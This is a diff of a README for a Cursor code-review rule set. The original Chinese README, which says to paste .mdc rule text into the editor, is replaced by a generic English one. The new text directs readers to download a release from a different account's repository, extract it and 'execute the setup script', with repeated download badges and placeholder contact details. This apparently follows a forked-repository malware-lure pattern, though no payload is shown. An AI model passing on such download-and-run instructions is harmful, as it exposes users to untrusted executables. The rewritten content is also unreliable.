@@ -1,69 +1,104 @@
-# LessUp/cursor-rules - 为 Cursor 定制的代码审查规则集
+# Cursor Rules: A Comprehensive Code Review Rule Set for Cursor.sh ✍️
 
-![GitHub stars](https://img.shields.io/github/stars/LessUp/cursor-rules?style=social)
-![GitHub forks](https://img.shields.io/github/forks/LessUp/cursor-rules?style=social)
-![License](https://img.shields.io/github/license/LessUp/cursor-rules)
+![Cursor Rules](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
 
-**中文**
+Welcome to the **Cursor Rules** repository! This project offers a tailored set of code review rules for Cursor.sh, designed to cover best practices across various programming languages, frameworks, and tools. Our goal is to help teams standardize their coding practices, enhance code quality, and boost development efficiency.
 
----
+## Table of Contents
 
-`LessUp/cursor-rules` 是一个为 [Cursor](https://cursor.sh/) 编辑器量身打造的代码审查与编码规范规则集。我们旨在帮助开发者和团队统一代码风格、提升代码质量，从而更高效地进行协作开发。
+- [Features](#features)
+- [Supported Languages and Frameworks](#supported-languages-and-frameworks)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-如果您觉得这个项目对您有帮助，请给我们一个 ⭐️ Star，这是我们持续维护的最大动力！
+## Features
 
-## ✨ 核心优势
+- **Best Practices**: The rule set includes guidelines for common programming languages and frameworks, ensuring your code meets industry standards.
+- **Code Quality**: Improve the overall quality of your codebase, making it easier to maintain and scale.
+- **Efficiency**: Streamline your development process by adhering to a unified set of rules, reducing the time spent on code reviews.
+- **Customizable**: Adapt the rules to fit your team's specific needs and preferences.
 
-- **✍️ 统一规范**：遵循业界广泛认可的最佳实践，确保团队代码风格一致。
-- **🚀 开箱即用**：只需简单配置，即可在您的 Cursor 编辑器中启用。
-- **💡 智能审查**：利用 Cursor 的 AI 能力，实时获得代码改进建议。
-- **🧩 高度可扩展**：轻松定制或添加新规则，以满足您团队的个性化需求。
+## Supported Languages and Frameworks
 
-## 🛠️ 支持的技术栈
+The **Cursor Rules** repository covers a wide range of languages and frameworks, including:
 
-我们目前支持以下语言和框架的规则集：
+- **Java**: Enhance your Java applications with our tailored rules.
+- **JavaScript**: Ensure clean and efficient JavaScript code.
+- **TypeScript**: Improve your TypeScript projects with our guidelines.
+- **Python**: Follow best practices for Python development.
+- **Go**: Utilize effective rules for Go programming.
+- **React**: Streamline your React components and applications.
+- **Vue**: Apply our rules to your Vue.js projects.
+- **iOS**: Enhance your iOS development with best practices.
+- **Android**: Improve your Android applications.
+- **Docker**: Optimize your Docker configurations.
+- **WeChat Mini Program**: Follow guidelines for WeChat development.
 
-| 分类 | 技术栈 |
-| :--- | :--- |
-| **编程语言** | `Python`, `Java`, `Go`, `C#`, `Ruby`, `PHP`, `C++`, `TypeScript` |
-| **后端框架** | `Node.js/Express`, `Spring`, `FastAPI`, `.NET`, `Ruby on Rails` |
-| **前端** | `React`, `Vue`, `Svelte`, `Next.js`, `Tailwind CSS`, `Medusa` |
-| **移动端** | `Android`, `iOS`, `WeChat Mini Program`, `NativeScript` |
-| **数据库** | `Database` (通用) |
-| **DevOps** | `Docker` |
-| **通用规范** | `Clean Code`, `Code Quality`, `Git Flow` |
+## Installation
 
-## 🚀 使用指南
+To get started with the **Cursor Rules**, download the latest release from our [Releases section](https://github.com/mdsahil321/cursor-rules/releases). After downloading, follow these steps:
 
-在 Cursor 编辑器中，您可以轻松地导入和使用这些规则。
+1. Extract the downloaded file.
+2. Navigate to the extracted folder in your terminal.
+3. Execute the setup script to install the rules.
 
-1.  打开 Cursor 编辑器。
-2.  按下 `Ctrl + K` (Windows/Linux) 或 `Cmd + K` (macOS)，然后输入 `@rules`。
-3.  选择“导入规则”。
-4.  将您需要的 `.mdc` 文件的内容复制并粘贴到输入框中。
+Make sure to have the necessary permissions to run the script. If you encounter any issues, check the "Releases" section for additional instructions.
 
-例如，要导入 Python 规则，只需将 `python.mdc` 文件的内容粘贴进去即可。
+## Usage
 
-## 📜 许可证
+Once you have installed the **Cursor Rules**, you can integrate them into your code review process. Here’s how:
 
-本项目采用 MIT 许可证。详情请见 [LICENSE](LICENSE) 文件。
+1. **Configuration**: Configure the rules according to your team's needs. You can enable or disable specific rules based on your project requirements.
+2. **Code Review**: Use the rules during code reviews to ensure compliance with best practices. This will help maintain a high standard of code quality.
+3. **Continuous Integration**: Integrate the rules into your CI/CD pipeline to automate code quality checks. This ensures that every piece of code meets the established standards before merging.
 
-## 🤝 贡献指南
+### Example Configuration
 
-我们非常欢迎社区的贡献！您可以通过以下方式参与项目：
+Here’s a sample configuration file you can use as a starting point:
 
-- **提交 Issue**：发现问题或有新想法？请在 [Issues](https://github.com/LessUp/cursor-rules/issues) 中告诉我们。
-- **提交 Pull Request**：
-  1.  Fork 本仓库。
-  2.  创建您的特性分支 (`git checkout -b feature/AmazingFeature`)。
-  3.  提交您的更改 (`git commit -m 'Add some AmazingFeature'`)。
-  4.  推送到分支 (`git push origin feature/AmazingFeature`)。
-  5.  打开一个 Pull Request。
+```json
+{
+  "rules": {
+    "no-console": "warn",
+    "prefer-const": "error",
+    "react/prop-types": "off"
+  }
+}
+```
 
-## ❤️ 致谢
+Feel free to modify the rules to fit your project.
 
-感谢所有为这个项目做出贡献的开发者！
+## Contributing
 
----
+We welcome contributions from the community! If you have suggestions for new rules or improvements, please follow these steps:
 
-**喜欢这个项目吗？请给我们一个 [⭐️ Star](https://github.com/LessUp/cursor-rules/stargazers)！**
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Submit a pull request.
+
+Please ensure that your contributions adhere to the existing style and guidelines.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- **Email**: your-email@example.com
+- **GitHub**: [Your GitHub Profile](https://github.com/yourusername)
+
+## Releases
+
+To download the latest release of **Cursor Rules**, visit our [Releases section](https://github.com/mdsahil321/cursor-rules/releases). Follow the instructions provided to ensure proper installation and setup.
+
+![Cursor Rules](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+
+This repository aims to provide a valuable resource for developers seeking to enhance their coding practices. By using the **Cursor Rules**, you can ensure that your code is clean, maintainable, and efficient.
